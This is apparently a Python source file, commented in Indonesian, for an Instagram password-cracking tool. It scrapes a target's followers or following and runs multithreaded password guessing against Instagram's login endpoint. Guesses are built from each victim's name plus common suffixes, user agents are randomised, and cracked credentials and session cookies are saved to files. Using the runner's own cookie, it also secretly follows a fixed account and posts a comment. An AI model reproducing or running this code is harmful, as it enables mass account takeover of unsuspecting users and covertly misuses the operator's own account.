#!/usr/bin/python3
# coding=utf-8 -*-

#----------------[ DI BUAT OLEH ANDA ]-------------#
import os, sys, time, json, random, platform, requests, rich, re
from concurrent.futures import ThreadPoolExecutor as khamdihiXV
from datetime import datetime
from os import system as sis
from time import time as tim

from rich.panel import Panel
from rich.console import Console

bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]

days = datetime.now().day
year = datetime.now().year
indo = "%s-%s-%s"%(days,reall,year)
ok,cp,loop,= [],[],0

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
ua_ig = "Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)"
komen = random.choice(["programmers bang?","Bakso kontoll","Panutan ku!","keren suhu♥"])

def CetakBanner(ulfahsadiyah,asu):
    Console(width=50).print(Panel(ulfahsadiyah,style=asu),justify='center')

def ulfah(kaya,kontol):
    Console(width=50).print(Panel(kaya,style=kontol))

def banner():
    CetakBanner('''[bold white]╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╦╔═╗
╠╩╗╠╦╝║ ║ ║ ║╣   ║║ ╦
╚═╝╩╚═╚═╝ ╩ ╚═╝  ╩╚═╝
( Di buat oleh [bold green]khamdihi [bold white]) ''','color(8)')

def masuk():
    os.system('clear');banner()
    ulfah('[bold white]masukan cookies akun instagram kamu, pastikan memakai akun tumbal','color(8)')
    coki = input(f'  {H}• {N}masukan cookie : {H}')
    try:
         with requests.Session() as xyzu:
             link = xyzu.get("https://i.instagram.com/api/v1/users/{}/info/".format(re.search('ds_user_id=(.*?);',str(coki)).group(1)), headers = {"user-agent":ua_ig}, cookies = {"cookie":coki}).json()["user"]["full_name"]
             Console(width=50).print(Panel(f"[bold white]selamat datang user [bold green]{link}[italic white]",title='🤗', style='bold white'))
             bot(coki,re.search('csrftoken=(.*?);',str(coki)).group(1))
    except (AttributeError,KeyError):
         Console(width=50).print(Panel("[bold red]cookie anda telah kadarluarsa/akun anda telah mati silakan cek dulu",title='😭', style='bold white'));time.sleep(3);masuk()

# JANGAN DI GANTI LAH, BOLEH DI TAMBAH JMBT
def bot(ku_jangan_di_ganti_asu,token):
    with requests.Session() as xyzu:
         try:
              head = {
                 "Host": "i.instagram.com",
                 "content-length": "0",
                 "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                 "x-ig-app-id": "1217981644879628",
                 "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                 "sec-ch-ua-mobile": "?1",
                 "x-instagram-ajax": "1006447742",
                 "viewport-width": "360",
                 "content-type": "application/x-www-form-urlencoded",
                 "accept": "*/*",
                 "user-agent": ua_ig,
                 "x-asbd-id": "198387",
                 "save-data": "on",
                 "x-csrftoken": token,
                 "sec-ch-ua-platform": '"Android"',
                 "origin": "https://www.instagram.com",
                 "sec-fetch-site": "same-site",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-dest": "empty",
                 "referer": "https://www.instagram.com/",
                 "accept-encoding": "gzip, deflate, br",
                 "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"
              }
              data = {
                 "comment_text": komen}
              posh = xyzu.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("54599387361"), headers=head, cookies={"cookie":ku_jangan_di_ganti_asu})
              posx = xyzu.post("https://i.instagram.com/api/v1/web/comments/2900156663158162275/add/", data=data, headers=head, cookies={"cookie":ku_jangan_di_ganti_asu})
              open('data/cokie.txt','w').write(ku_jangan_di_ganti_asu)
              open('data/csrftoken.txt','w').write(token)
              menu()
         except requests.exceptions.ConnectionError:
              Console(width=70).print(Panel(" [italic red]Tidak ada koneksi internet yang aktif!", title='🧐', style='bold red'));exit(0)

def convert(nama, kueh):
    with requests.Session() as jembut:
         for i in nama.split(','):
             link = jembut.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(i), headers = {"user-agent":ua_ig}, cookies = {"cookie":kueh}).json()
             data = link["data"]["user"]
             return data["id"]

def menu():
    try:
          coki = open("data/cokie.txt","r").read()
          user = re.search('ds_user_id=(.*?);',str(coki)).group(1)
    except (FileNotFoundError,AttributeError):masuk()
    try:
          link = requests.get("https://i.instagram.com/api/v1/users/{}/info/".format(user), cookies = {"cookie":coki}, headers = {"user-agent":ua_ig}).json()['user']
          nama = link['full_name']
          wing = link['following_count']
          wers = link['follower_count']
    except KeyError:masuk()
    except requests.exceptions.ConnectionError:Console(width=70).print(Panel(" [italic red]Tidak ada koneksi internet yang aktif!", title='�', style='bold red'));exit(0)
    os.system('clear')
    banner()
    ulfah(f'''[bold white][[bold green]•[bold white]] Welcome   : [bold green]{nama}
[bold white][[bold green]•[bold white]] Followers : [bold green]{wers}
[bold white][[bold green]•[bold white]] Following : [bold green]{wing}''','color(8)')
    ulfah('''[bold white][[bold green]1[bold white]] Crack dari followers
[bold white][[bold green]2[bold white]] Crack dari following
[bold white][[bold green]3[bold white]] Check hasil crack
[bold white][[bold green]0[bold white]] Keluar...''','color(8)')
    cuih = input(f'  {H}• {N}pilih menu : {H}')
    if cuih in ['1','01']:
        ulfah('[bold white]masukan username target, kamu juga bisa gunakan tanda koma untuk pemisahan contoh name1,name2','color(8)')
        nama = input(f'  {H}• {N}masukan nama : {H}')
        user = convert(nama,coki)
        dump().followers(user,coki,'')

    elif cuih in ['2','02']:
        ulfah('[bold white]masukan username target, kamu juga bisa gunakan tanda koma untuk pemisahan contoh name1,name2','color(8)')
        nama = input(f'  {H}• {N}masukan nama : {H}')
        user = convert(nama,coki)
        dump().following(user,coki,khamdihidev=' ')
    elif cuih in ['3','03']:
        afah,iyah=[],0
        ulfah('[bold white][[bold green]1[bold white]] chek hasil akun [bold green]OK\n[bold white][[bold green]2[bold white]] chek hasil akun [bold yellow]CP','color(8)')
        akun = input(f'  {H}• {N}pilih menu : {H}')
        if akun in ['1','01']:
           try:list=os.listdir('OK')
           except:exit(f'\n  {M}• {N}File tidak ada!')
           print('')
           for xnxx in list:
               afah.append(xnxx)
               iyah +=1
               print('\r  %s%s. %s%s'%(H, iyah, N, xnxx))
           nomor = input(f'\n  {H}• {N}masukan nomor : {H}')
           try:kham = afah[int(nomor)-1]
           except Exception as e:exit(e)
           okeh = open('OK/{}'.format(kham),'r').read()
           print(okeh)
           exit(0)
        else:
           try:list=os.listdir('CP')
           except:exit(f'\n  {M}• {N}File tidak ada!')
           print('')
           for xnxx in list:
               afah.append(xnxx)
               iyah +=1
               print('\r  %s%s. %s%s'%(H, iyah, N, xnxx))
           nomor = input(f'\n  {H}• {N}masukan nomor : {H}')
           try:kham = afah[int(nomor)-1]
           except Exception as e:exit(e)
           okeh = open('CP/{}'.format(kham),'r').read()
           print(okeh)
           exit(0)
    elif cuih in ['0','00']:
          exit('rm -rf data/cokie.txt')
    else:
          menu()


class dump:

    def __init__(self):
        self.id = []

    def followers(self, userid, cookies, khamdihidev):
        with requests.Session() as kontol:
               try:
                     self.url = kontol.get("https://i.instagram.com/api/v1/friendships/{}/followers/?count=100&max_id={}".format(userid,khamdihidev), headers = {"user-agent":ua_ig}, cookies = {"cookie":cookies})
                     for self.txt in json.loads(self.url.text)["users"]:
                         if self.txt["username"] in self.id:
                              continue
                         self.id.append(self.txt["username"]+"<=>"+self.txt["full_name"])
                     if "next_max_id" in json.loads(self.url.text):self.followers(userid, cookies, json.loads(self.url.text)["next_max_id"])
                     self.selanjutnya(self.id)
               except KeyError:
                      Console(width=50).print(Panel("[bold red]dump error, cari username lain atau ganti tumbal",style="bold cyan"));time.sleep(2);menu()

    def following(self, userid, cookies, khamdihidev):
          with requests.Session() as kontol:
               try:
                     self.url = kontol.get("https://i.instagram.com/api/v1/friendships/{}/following/?count=100&max_id={}".format(userid, khamdihidev), headers = {"user-agent":ua_ig}, cookies = {"cookie":cookies})
                     for self.txt in json.loads(self.url.text)["users"]:
                         if self.txt["username"] in self.id:
                              continue
                         self.id.append(self.txt["username"]+"<=>"+self.txt["full_name"])
                     if "next_max_id" in json.loads(self.url.text):self.following(userid, cookies, json.loads(self.url.text)["next_max_id"])
                     self.selanjutnya(self.id)
               except KeyError:
                     Console(width=50).print(Panel("[bold red]dump error, cari username lain atau ganti tumbal",style="bold cyan"));time.sleep(2);menu()

    def selanjutnya(self, kontol):
        okeh_ = f'[bold white][[bold green]•[bold white]] results OK : OK/OK-{indo}.text\n[bold white][[bold green]•[bold white]] results CP : CP/CP-{indo}.text'
        print(f'\r  {H}• {N}Berhasil dump username : {H}{len(kontol)}')
        ulfah('''[bold white][[bold green]1[bold white]] sandi : nama,nama123
[bold white][[bold green]2[bold white]] sandi : nama,nama1234,nama12345
[bold white][[bold green]3[bold white]] sandi : nama,nama123,nama1234,nama12345 ++''','color(8)')
        sandi = input(f'  {H}• {N}pilih menu : {H}')
        if sandi in ['3','03']:
           ulfah('[bold white]gunakan tanda koma untum pemisahan contoh password1,password2','color(8)')
           pwek = input(f'  {H}• {N}masukan sandi : ')
           if len(pwek) <=5:
                exit(f'\n  {M} Sandi harus lebih dari 5 karaktet')

        ulfah(okeh_,'color(8)')
        with khamdihiXV(max_workers=30) as coid:
             for mylove in kontol:
                 try:
                       username = mylove.split('<=>')[0]
                       password = mylove.split('<=>')[1]
                       for x in password.split(' '):
                           if len(x) <3:
                               continue
                           else:
                               if sandi in ['1','01']:
                                    pwx = [x,x+'123',x+'1234','bismillah','sayang',x.lower()+'123',x.lower()+'1234']
                               elif sandi in ['2','02']:
                                    pwx = [x,x+'123',x+'1234',x+'12345','bismillah',x.lower()+'123',x.lower()+'1234',x.lower()+'12345']
                               else:
                                    iii = [x,x+'123',x+'1234',x+'12345',x+'321',x.lower()+'123',x.lower()+'1234']
                                    pwx = iii + pwek.split(',')
                               coid.submit(self.crack, username, pwx)
                 except Exception as e:print(e)
        exit(f'\n * crack selesai Ok:{len(ok)} CP:{len(cp)}')

    def acount(self, username):
        try:
            link = requests.Session().get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":ua_ig,"x-ig-app-id":'936619743392459'}).json()["data"]["user"]
            nama = link.get("full_name")
            mengikut = link.get("edge_follow").get("count")
            pengikut = link.get("edge_followed_by").get("count")
            postingan = link.get("edge_owner_to_timeline_media").get("count")
        except Exception as e:
            nama = "'-'"
            mengikut = "'-'"
            pengikut = "'-'"
            postingan = "'-'"

        return nama, pengikut, mengikut, postingan

    def UserAgent(self):
        z = random.randint(3000,4000)
        i = random.randint(50,70)
        x = random.randint(80,120)
        u = float(random.randint(1,12))
        a = random.randint(6,12)
        return (f'Mozilla/5.0 (Linux; Android {random.randint(6,12)}; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{float(random.randint(1,12))} Chrome/{random.randint(50,70)}.0.{random.randint(3000,4000)}.{random.randint(80,120)} Mobile Safari/537.36')

    def crack(self, user, pwx):
        global ok,cp,loop
        sys.stdout.write(f'\r {H}* {N}crack : {loop}/{len(self.id)} OK:{len(ok)} CP:{len(cp)}');sys.stdout.flush()
        for pw in pwx:
             try:
                   i = requests.Session()
                   link = i.get('https://www.instagram.com/accounts/login')
                   i.headers.update({
                        'Host': 'www.instagram.com',
                        'content-length': '327',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'x-ig-app-id': '1217981644879628',
                        'x-ig-www-claim': '0',
                        'sec-ch-ua-mobile': '?1',
                        'x-instagram-ajax': '1006631170',
                        'user-agent': self.UserAgent(),
                        'viewport-width': '360',
                        'content-type': 'application/x-www-form-urlencoded',
                        'accept': '*/*',
                        'x-requested-with': 'XMLHttpRequest',
                        'x-asbd-id': '198387',
                        'x-csrftoken': open('data/csrftoken.txt','r').read(),
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua-platform': '"Android"',
                        'origin': 'https://www.instagram.com',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-dest': 'empty',
                        'referer': 'ttps://www.instagram.com/',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
                   })
                   data = {
                      'enc_password':'#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(tim()),pw),
                      'username':user,
                      'queryParams':'{}',
                      'optIntoOneTap':'false',
                      'trustedDeviceRecords':'{}'
                   }
                   Ulfa = i.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data=data)
                   sydh = json.loads(Ulfa.text)
#                   i.headers.update({'x-csrftoken':i.cookies['csrftoken']})
                   if 'userId' in sydh:
                       nama, pengikut, mengikut, postingan = self.acount(user)
                       coki = ";".join([str(x)+"="+str(e) for x,e in i.cookies.get_dict().items()])
                       print(f'\r {H}*  --> {user}|{pw}')
                       print(f'''\r
 {H}   • {N}username  : {H}{nama}
 {H}   • {N}Pengikut  : {H}{pengikut}
 {H}   • {N}Mengikuti : {H}{mengikut}
 {H}   • {N}Postingan : {H}{postingan}
 {H}   • {N}Cookies   : {H}{coki} ''')
                       open(f'OK/OK-{indo}.txt','a').write(f'{user}|{pw}')
                       ok.append(user)
                       break
                   elif 'checkpoint_url' in sydh:
                       nama, pengikut, mengikut, postingan = self.acount(user)
                       print(f'\r {K}*  --> {user}|{pw}')
                       print(f'''\r
 {H}   • {N}username  : {H}{nama}
 {H}   • {N}Pengikut  : {H}{pengikut}
 {H}   • {N}Mengikuti : {H}{mengikut}
 {H}   • {N}Postingan : {H}{postingan} ''')
                       open(f'CP/CP-{indo}.txt','a').write(f'{user}|{pw}')
                       cp.append(user)
                       break
                   else:
                       continue
             except Exception as e:self.crack(user,pwx)
        loop +=1

def folder():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data')
    except:pass
if __name__ == '__main__':
   sis('git pull')
   folder()
   menu()
